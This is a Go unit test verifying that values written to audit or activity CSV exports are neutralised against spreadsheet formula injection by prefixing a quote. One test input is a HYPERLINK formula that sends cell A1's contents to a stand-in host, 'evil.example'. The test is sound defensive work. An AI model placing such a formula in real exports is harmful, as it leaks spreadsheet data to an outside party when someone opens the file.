package app

import "testing"

// A field that reaches the audit or activity CSV from outside — a member's name, a sign-in's
// User-Agent — must not run as a formula when an admin opens the export.
func TestCSVCellNeutralisesFormulas(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{`=HYPERLINK("https://evil.example?"&A1,"x")`, `'=HYPERLINK("https://evil.example?"&A1,"x")`},
		{"+1+1", "'+1+1"},
		{"-2+3", "'-2+3"},
		{"@SUM(A1:A9)", "'@SUM(A1:A9)"},
		{"\tstartswithtab", "'\tstartswithtab"},
		{"\rstartswithcr", "'\rstartswithcr"},
		// Ordinary values are untouched.
		{"Priya Shah", "Priya Shah"},
		{"member.role_changed", "member.role_changed"},
		{"192.0.2.1", "192.0.2.1"},
		{"", ""},
	} {
		if got := csvCell(tc.in); got != tc.want {
			t.Errorf("csvCell(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
	row := csvRow("=cmd", "ok", "-x")
	if row[0] != "'=cmd" || row[1] != "ok" || row[2] != "'-x" {
		t.Errorf("csvRow neutralised the wrong cells: %q", row)
	}
}
